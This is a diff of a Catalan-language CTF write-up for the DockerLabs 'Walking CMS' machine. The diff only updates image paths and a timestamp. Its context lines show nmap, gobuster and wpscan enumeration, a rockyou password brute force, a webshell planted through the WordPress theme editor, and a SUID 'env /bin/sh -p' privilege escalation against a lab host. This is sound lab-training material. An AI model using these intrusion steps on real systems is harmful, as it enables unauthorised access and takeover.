@@ -1,7 +1,7 @@
 ---
 publish: true
 created: 2026-09-11T12:16:55.925Z
-modified: 2026-09-11T12:24:55.256Z
+modified: 2026-09-11T18:12:57.243Z
 ---
 
 # Walking CMS
@@ -20,9 +20,9 @@ Created time: 5 de diciembre de 2024 21:36
 sudo nmap -p- -sS -vvv  -n -Pn 172.17.0.2 -oG allports
 ```
 
-![image.png](/images/DockerLabs/image.png)
+![image.png](WriteUps/images/DockerLabs/image.png)
 
-![image.png](/images/DockerLabs/image%201.png)
+![image.png](WriteUps/images/DockerLabs/image 1.png)
 
 Gobuster per trobar directoris :
 
@@ -30,7 +30,7 @@ Gobuster per trobar directoris :
 gobuster dir -u [http://172.17.0.2](http://172.17.0.2/) -w /usr/share/wordlists/dirb/common.txt
 ```
 
-![image.png](/images/DockerLabs/image%202.png)
+![image.png](WriteUps/images/DockerLabs/image 2.png)
 
 Es un wordpress. Enumerem usuaris :
 
@@ -38,7 +38,7 @@ Es un wordpress. Enumerem usuaris :
 sudo wpscan --url [http://172.17.0.2/wordpress](http://172.17.0.2/wordpress) --enumerate u
 ```
 
-![image.png](/images/DockerLabs/image%203.png)
+![image.png](WriteUps/images/DockerLabs/image 3.png)
 
 Usuari : mario
 
@@ -48,7 +48,7 @@ Busquem password amb :
 sudo wpscan --url [http://172.17.0.2/wordpress](http://172.17.0.2/wordpress) -P /usr/share/wordlists/rockyou.txt
 ```
 
-![image.png](/images/DockerLabs/image%204.png)
+![image.png](WriteUps/images/DockerLabs/image 4.png)
 
 Password: love
 
@@ -57,11 +57,11 @@ mario/love
 Entrem al wp-admin amb les credencials
 entrem al editor de themes i creem un nou com a test.php amb la webshell:
 
-![image.png](/images/DockerLabs/image%205.png)
+![image.png](WriteUps/images/DockerLabs/image 5.png)
 
 Ens posen a l'espera i executem la webshell:
 
-![image.png](/images/DockerLabs/image%206.png)
+![image.png](WriteUps/images/DockerLabs/image 6.png)
 
 Mire fitxer wp-config.php
 
@@ -92,4 +92,4 @@ env /bin/sh -p
 
 ```
 
-![image.png](/images/DockerLabs/image%207.png)
+![image.png](WriteUps/images/DockerLabs/image 7.png)
